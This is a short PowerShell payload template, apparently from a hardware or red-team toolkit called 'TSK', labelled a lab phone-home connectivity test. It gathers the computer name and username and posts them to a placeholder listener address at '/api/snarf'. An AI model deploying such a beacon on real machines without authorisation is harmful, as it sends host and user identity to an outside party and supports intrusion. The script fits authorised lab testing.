# TSK built-in | Lab Ping - phone-home connectivity test
# Set LHOST/LPORT in TSK CONFIG before flashing.
$lhost = "{{LHOST}}"
$lport = "{{LPORT}}"
$body = @{
    hostname = $env:COMPUTERNAME
    user     = $env:USERNAME
    note     = "TSK lab_ping built-in"
} | ConvertTo-Json -Compress
try {
    Invoke-RestMethod -Uri "http://${lhost}:${lport}/api/snarf" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 8
} catch {
    Write-Host "lab_ping failed: $_"
}
